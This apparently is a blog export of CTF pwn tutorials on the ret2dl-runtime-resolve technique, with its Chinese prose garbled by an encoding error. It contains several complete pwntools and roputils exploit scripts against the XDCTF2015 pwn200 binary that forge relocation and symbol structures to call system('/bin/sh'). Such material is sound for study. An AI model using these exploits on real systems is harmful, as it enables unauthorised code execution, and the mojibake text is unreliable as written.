    <content type="text"><![CDATA[ÂâçË®Ä ‰∏ÄÊ≠•‰∏ÄÊ≠•ÊûÑÂª∫ dl-runtime-resolveÔºåËØ¶ÁªÜÁêÜËß£ÂÖ∂Ëß£ÊûêËøáÁ®ã ÂèÇËÄÉ http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ÂèÇËÄÉ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ elf Êñá‰ª∂ÈìæÊé• https://github.com/hitcxy/pwn-challenges/tree/master/study ÊºèÊ¥ûÂà©Áî®ÊñπÂºè ÊéßÂà∂ eip ‰∏∫ PLT[0] ÁöÑÂú∞ÂùÄÔºåÂè™ÈúÄ‰º†ÈÄí‰∏Ä‰∏™ index_arg ÂèÇÊï∞ ÊéßÂà∂ index_arg ÁöÑÂ§ßÂ∞èÔºå‰Ωø reloc ÁöÑ‰ΩçÁΩÆËêΩÂú®ÂèØÊéßÂú∞ÂùÄÂÜÖ ‰º™ÈÄ† reloc ÁöÑÂÜÖÂÆπÔºå‰Ωø sym ËêΩÂú®ÂèØÊéßÂú∞ÂùÄÂÜÖ ‰º™ÈÄ† sym ÁöÑÂÜÖÂÆπÔºå‰Ωø name ËêΩÂú®ÂèØÊéßÂú∞ÂùÄÂÜÖ ‰º™ÈÄ† name ‰∏∫‰ªªÊÑèÂ∫ìÂáΩÊï∞ÔºåÂ¶Ç system stage1 ÂÖàÊääÊ†àËøÅÁßªÂà∞ bss ‰∏äÔºåÂπ∂ËøîÂõû write@plt 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"payload2 = 'AAAA' # Êé•‰∏ä‰∏Ä‰∏™payloadÁöÑleave-&gt;pop ebp ; retpayload2 += p32(write_plt)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage2 ÊéßÂà∂ eip ËøîÂõû PLT[0] ÔºåË¶ÅÂ∏¶‰∏ä write ÁöÑ index_offset 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write's indexpayload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage3 ÊéßÂà∂ index_offset Ôºå‰ΩøÂÖ∂ÊåáÂêëÊàë‰ª¨ÊûÑÈÄ†ÁöÑ fake_reloc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28ÊåáÂêëfake_relocÔºåÂáèÂéªrel_pltÂç≥ÂÅèÁßªwrite_got = elf.got['write']r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)ÁöÑ‰ΩçÁΩÆpayload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage4 ËøôÊ¨°ÊûÑÈÄ† fake_sym Ôºå‰ΩøÂÖ∂ÊåáÂêëÊàë‰ª¨ÊéßÂà∂ÁöÑ st_name 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # ËøôÈáåÁöÑÂØπÈΩêÊìç‰ΩúÊòØÂõ†‰∏∫dynsymÈáåÁöÑElf32_SymÁªìÊûÑ‰ΩìÈÉΩÊòØ0x10Â≠óËäÇÂ§ßÂ∞èfake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # Èô§‰ª•0x10Âõ†‰∏∫Elf32_SymÁªìÊûÑ‰ΩìÁöÑÂ§ßÂ∞è‰∏∫0x10ÔºåÂæóÂà∞writeÁöÑdynsymÁ¥¢ÂºïÂè∑r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)ÁöÑ‰ΩçÁΩÆpayload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)ÁöÑ‰ΩçÁΩÆpayload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage5 Êää st_name ÊåáÂêëËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ &quot;write&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # Âä†0x10Âõ†‰∏∫Elf32_SymÁöÑÂ§ßÂ∞è‰∏∫0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)ÁöÑ‰ΩçÁΩÆpayload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)ÁöÑ‰ΩçÁΩÆpayload2 += "write\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage6 ÊõøÊç¢ write ‰∏∫ system ÔºåÂπ∂‰øÆÊîπ system ÁöÑÂèÇÊï∞ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # ËØª100‰∏™Â≠óËäÇÂà∞base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # Êääbase_stage popÂà∞ebp‰∏≠payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;Â∞ÜespÊåáÂêëbase_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # Âä†0x10Âõ†‰∏∫Elf32_SymÁöÑÂ§ßÂ∞è‰∏∫0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(base_stage + 80)payload2 += 'B' * 4payload2 += 'B' * 4payload2 += fake_reloc # (base_stage+28)ÁöÑ‰ΩçÁΩÆpayload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)ÁöÑ‰ΩçÁΩÆpayload2 += "system\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dl-runtime-resolve]]></title>
    <url>%2F2020%2Fdl-runtime-resolve%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Âú®Linux‰∏≠Â¶ÇÊûúÁ®ãÂ∫èÊÉ≥Ë¶ÅË∞ÉÁî®ÂÖ∂ÂÆÉÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑÂáΩÊï∞ÔºåÂøÖÈ°ªË¶ÅÂú®Á®ãÂ∫èÂä†ËΩΩÁöÑÊó∂ÂÄôÂä®ÊÄÅÈìæÊé•ÔºõÂú®‰∏Ä‰∏™Á®ãÂ∫èËøêË°åËøáÁ®ã‰∏≠ÔºåÂèØËÉΩÂæàÂ§öÂáΩÊï∞Âú®Á®ãÂ∫èÊâßË°åÂÆåÊó∂ÈÉΩ‰∏ç‰ºöÁî®Âà∞ÔºåÊØîÂ¶Ç‰∏Ä‰∫õÈîôËØØÂ§ÑÁêÜÂáΩÊï∞ÊàñËÄÖ‰∏Ä‰∫õÁî®Êà∑ÂæàÂ∞ëÁî®Âà∞ÁöÑÂäüËÉΩÊ®°ÂùóÔºåÊâÄ‰ª•ELFÈááÁî®‰∏ÄÁßçÂè´ÂÅöÂª∂ËøüÁªëÂÆö(Lazy Binding)ÁöÑÂÅöÊ≥ïÔºåÂü∫Êú¨ÊÄùÊÉ≥Â∞±ÊòØÂΩìÂáΩÊï∞Á¨¨‰∏ÄÊ¨°Ë¢´Ë∞ÉÁî®ÁöÑÊó∂ÂÄôÊâçËøõË°åÁªëÂÆöÔºàÁ¨¶Âè∑Êü•Êâæ„ÄÅÈáçÂÆö‰ΩçÁ≠âÔºâÔºõËÄåÂú®Linux‰∏≠ÊòØÂà©Áî®_dl_runtime_resolve(link_map_obj, reloc_index)ÂáΩÊï∞Êù•ÂØπÂä®ÊÄÅÈìæÊé•ÁöÑÂáΩÊï∞ËøõË°åÈáçÂÆö‰ΩçÁöÑ„ÄÇ _dl_runtime_resolveÂáΩÊï∞ÂÖ∑‰ΩìËøêË°åÊ®°Âºè È¶ñÂÖàÁî®link_mapËÆøÈóÆ.dynamicÔºåÂàÜÂà´ÂèñÂá∫.dynstr„ÄÅ.dynsym„ÄÅ.rel.pltÁöÑÂú∞ÂùÄ .rel.plt+ÂèÇÊï∞reloc_indexÔºåÊ±ÇÂá∫ÂΩìÂâçÂáΩÊï∞ÁöÑÈáçÂÆö‰ΩçË°®È°πElf32_RelÁöÑÊåáÈíàÔºåËÆ∞‰Ωúrel rel-&gt;r_info &gt;&gt; 8 ‰Ωú‰∏∫.dynsymÁöÑ‰∏ãÊ†áÔºåÊ±ÇÂá∫ÂΩìÂâçÂáΩÊï∞ÁöÑÁ¨¶Âè∑Ë°®È°πElf32_SymÁöÑÊåáÈíàÔºåËÆ∞‰Ωúsym .dynstr + sym-&gt;st_nameÂæóÂá∫Á¨¶Âè∑Âêç Â≠óÁ¨¶‰∏≤ÊåáÈíà Âú®Âä®ÊÄÅÈìæÊé•Â∫ìÊü•ÊâæËøô‰∏™ÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂπ∂‰∏îÊääÂú∞ÂùÄËµãÂÄºÁªô*rel-&gt;r_offsetÔºåÂç≥GOTË°® ÊúÄÂêéË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞ ‰ª•puts‰∏∫‰æãËøΩË∏™‰∏Ä‰∏ãELFÊñá‰ª∂libcÂáΩÊï∞Ëß£ÊûêËøáÁ®ãcall puts@plt siËøõÂÖ•call puts@plt Âõ†‰∏∫‰ºöjmp dword ptr [0x804a00c]ÔºåÊâÄ‰ª•Êü•Áúã‰∏Ä‰∏ã0x804a00cÁöÑÂÜÖÂÆπÔºåÂ≠òÊîæÁöÑÊòØ0x080482e6Âú∞ÂùÄÔºåÂÖ∂‰∏≠0x080482e6ÊòØputs@pltÁ¨¨‰∫åÊù°Êåá‰ª§ÁöÑÂú∞ÂùÄÔºåÂç≥read@got‰∏≠ÂàùÂßãÂ≠òÊîæread@pltÁöÑÁ¨¨‰∫åÊù°Êåá‰ª§Âú∞ÂùÄ jmp 0x80482d0 ÂÖ∂‰∏≠ds:0x804a008Â≠òÊîæÁöÑÊòØ_dl_runtime_resolveÁöÑÂú∞ÂùÄ ËøôÊ†∑ÁöÑËØùÔºåÂä†‰∏ä‰πãÂâçÁöÑpush 0ÔºåÂ∞±push‰∫Ü‰∏§‰∏™ÂèÇÊï∞ÔºåËøô‰∏§‰∏™ÂèÇÊï∞ÂàöÂ•ΩÊòØ_dl_runtime_resolve(link_map_obj, reloc_index)ÈúÄË¶ÅÁöÑÂèÇÊï∞ÔºåÂÖ∂‰∏≠0x804a004Â∞±ÊòØlink_mapÊåáÈíàÔºå0Â∞±ÊòØreloc_index 12push 0push dword ptr [0x804a004] ÈÇ£‰πàÊàë‰ª¨ÁúãÁúãÈÄöËøáËøô‰∏§‰∏™ÂèÇÊï∞ÊòØÂ¶Ç‰ΩïÊâæÂà∞putsÂáΩÊï∞ÁöÑÂë¢ È¶ñÂÖàÊâæÂà∞link_mapÁöÑÂú∞ÂùÄ ÁÑ∂ÂêéÈÄöËøálink_mapÊâæÂà∞.dynamicÁöÑÂú∞ÂùÄÔºåÂÖ∂‰∏≠Á¨¨‰∏â‰∏™Âú∞ÂùÄÂ∞±ÊòØ.dynamicÁöÑÂú∞ÂùÄÔºåÂç≥0x8049f14 ÁÑ∂ÂêéÈÄöËøá.dynamicÊù•ÊâæÂà∞.dynstr„ÄÅ.dynsym„ÄÅ.rel.pltÁöÑÂú∞ÂùÄ.dynamicÁöÑÂú∞ÂùÄÂä†0x44ÁöÑ‰ΩçÁΩÆÊòØ.dynstr:[0x08049f14+0x44]=[0x08049f58]ÔºåÂç≥0x0804821c.dynamicÁöÑÂú∞ÂùÄÂä†0x4cÁöÑ‰ΩçÁΩÆÊòØ.dynsym:[0x08049f14+0x4c]=[0x08049f60]ÔºåÂç≥0x080481cc.dynamicÁöÑÂú∞ÂùÄÂä†0x84ÁöÑ‰ΩçÁΩÆÊòØ.rel.plt:[0x08049f14+0x84]=[0x08049f98]ÔºåÂç≥0x08048298 ÁÑ∂ÂêéÁî®.rel.pltÁöÑÂú∞ÂùÄÂä†‰∏äÂèÇÊï∞reloc_indexÔºåÂç≥0x8048298+0=0x8048298ÊâæÂà∞ÂáΩÊï∞ÁöÑÈáçÂÆö‰ΩçË°®È°πElf32_RelÁöÑÊåáÈíàÔºåËÆ∞‰Ωúrel ËøôÈáårel‰∏∫0x8048298ÔºåÊâÄ‰ª• 12r_offset = 0x804a00cr_info = 107h ÈÄöËøáElf32_relÁªìÊûÑÁöÑr_info &gt;&gt; 8 = 107h &gt;&gt; 8 = 1 ‰Ωú‰∏∫.dynsym‰∏≠ÁöÑ‰∏ãÊ†á Êü•Áúã0x80481dcÂÜÖÂ≠òÔºåÊâæÂà∞putsÂú®.dynstrË°®È°πÁ¥¢Âºï‰∏∫0x1aÔºåÊâÄ‰ª•st_nameÁöÑÂú∞ÂùÄ‰∏∫0x804821c+0x1a=0x8048236 ÊúÄÂêéÂú®Âä®ÊÄÅÈìæÊé•Â∫ìÊü•ÊâæËøô‰∏™ÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂπ∂‰∏îÊääÂú∞ÂùÄËµãÂÄºÁªô*rel-&gt;r_offsetÔºåÂç≥GOTË°®Â∞±ÂèØ‰ª•‰∫Ü Âà©Áî®ÊÄùË∑Ø ‰∫ãÂÆû‰∏äÔºåËôöÊãüÂú∞ÂùÄÊòØ‰ªést_nameÂæóÊù•ÁöÑÔºåÂè™Ë¶ÅÊàë‰ª¨ËÉΩÂ§ü‰øÆÊîπËøô‰∏™st_nameÁöÑÂÜÖÂÆπÂ∞±ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂáΩÊï∞ÔºåÊØîÂ¶ÇÊääst_nameÁöÑÂÜÖÂÆπ‰øÆÊîπ‰∏∫&quot;system&quot; reloc_indexÂç≥ÂèÇÊï∞nÊòØÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ÁöÑÔºåÊàë‰ª¨ÈúÄË¶ÅÂÅöÁöÑ‰∫ãÈÄöËøá‰∏ÄÁ≥ªÂàóÊìç‰ΩúÔºåÊääreloc_indexÂèØÊéßËΩ¨Âåñ‰∏∫st_nameÂèØÊéßÔºõÊàë‰ª¨ÈúÄË¶ÅÂú®‰∏Ä‰∏™ÂèØÂÜôÂú∞ÂùÄ‰∏äÊûÑÈÄ†‰∏ÄÁ≥ªÂàó‰º™ÁªìÊûÑÂ∞±ÂèØ‰ª•ÂÆåÊàêÂà©Áî®ÊàñÂú®Êù°‰ª∂ÂÖÅËÆ∏ÁöÑÊÉÖÂÜµ‰∏ãÁõ¥Êé•‰øÆÊîπ.dynstr ÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂú®Á®ãÂ∫è‰∏≠Êâæ‰∏ÄÊÆµÁ©∫Èó¥startÂá∫Êù•ÔºåÊîæÊàë‰ª¨Áõ¥Êé•ÊûÑÈÄ†ÁöÑfake_dynsymÔºåfake_dynstrÂíåfake_rel_pltÁ≠âÔºåÁÑ∂ÂêéÂà©Áî®Ê†àËøÅÁßªÂà∞ÊâãÊ≥ïÂ∞ÜÊ†àËΩ¨ÁßªÂà∞start ËÆ°ÁÆóreloc_index relic_index = fake_rel_plt_addr - 0x804833c ËÆ°ÁÆór_info r_infoÁöÑËÆ°ÁÆóÊñπÊ≥ïÊúâ‰∏§‰∏™Ê≠•È™§ x = ÔºàÊ¨≤‰º™ÈÄ†ÁöÑÂú∞ÂùÄ - .dynsymÂü∫Âú∞ÂùÄÔºâ/ 0x10 r_info = x &lt;&lt; 8 | 0x7 ËÆ°ÁÆóst_name st_name = fake_dynstr_addr - 0x804827c ‰æãÂ≠êÔºàËøôÈáåÊúâXDCTF2015ÁöÑ pwn200Ôºâ ÊñπÊ≥ï‰∏Ä Áõ¥Êé•‰ΩøÁî® write Ê≥ÑÊºè libc ÔºåÁÑ∂ÂêéÊâßË°å system(&#39;/bin/sh&#39;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *local=1pc='./main'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')pwn200=ELF('./main')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(p , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': write_plt = pwn200.plt['write'] lg('write_plt', write_plt) write_got = pwn200.got['write'] lg('write_got', write_got) start_addr = pwn200.symbols['_start'] lg('start_addr', start_addr) ru("Welcome to XDCTF2015~!\n") payload = 'a'*0x6c payload += 'b'*4 payload += p32(write_plt) payload += p32(start_addr) payload += p32(1) payload += p32(write_got) payload += p32(4) sl(payload) write_addr = u32(rv(4)) lg('write_addr', write_addr) libc_base = write_addr - libc.symbols['write'] system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + libc.search("/bin/sh").next() lg('libc_addr', libc_base) lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a'*0x6c payload += 'b'*4 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() ÊñπÊ≥ï‰∫å Áõ¥Êé•‰ΩøÁî®‰∫ÜroputilsÂ∫ìÔºåÊØîËæÉÁÆÄÊ¥Å 123456789101112131415161718192021222324252627# coding=utf-8from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextprocessName = 'main'offset = 112r = process('./' + processName)context.log_level = 'debug'rop = ROP('./' + processName)bss_base = rop.section('.bss')buf = rop.fill(offset)buf += rop.call('read', 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string('/bin/sh')buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, 'system')buf += rop.fill(100, buf)r.send(buf)r.interactive() ÊñπÊ≥ï‰∏â ÂÖ∂ÂÆû‰∏ÄÊ≠•‰∏ÄÊ≠•‰º™ÊûÑÈÄ†ËÉΩÊõ¥ÂÆπÊòìÁêÜËß£ËøáÁ®ãÔºåÂèØ‰ª•ÂèÇËÄÉÈ´òÁ∫ßROP ret2dl_runtime ‰πãÈÄöÊùÄËØ¶Ëß£ÂíåROPÈ´òÁ∫ßÁî®Ê≥ï‰πãret2_dl_runtime_resolve ‰∏äÈù¢ÊûÑÈÄ†ÁöÑROPÂ∑¶ËæπÊòØÂÅö‰∏Ä‰∏™Ê†àÁöÑËøÅÁßª Âè≥ËæπÊòØ‰º™ÈÄ†ÁöÑËß£ÊûêÈìæ 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']name = './main'p = process(name)elf= ELF(name)rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851Dstart = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x8#n index_argn = fake_rel_plt_addr - rel_plt_addrr_info = (((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got['read']) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = "system"+'\x00'+'\x00'fake_dynstr += "/bin/sh"+'\x00'pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil('Welcome to XDCTF2015~!\n')p.sendline(pay1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(".rel_plt: " + hex(rel_plt_addr))success(".dynsym: " + hex(dynsym_addr))success(".dynstr: " + hex(dynstr_addr))success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))success("fake_dynsym_addr: " + hex(fake_dynsym_addr))success("fake_dynstr_addr: " + hex(fake_dynstr_addr))success("n: " + hex(n))success("r_info: " + hex(r_info))success("offset: " + hex(str_offset))success("system_addr: " + hex(fake_dynstr_addr))success("bss_addr: " + hex(elf.bss()))p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2csu]]></title>
    <url>%2F2020%2Fret2csu%2F</url>
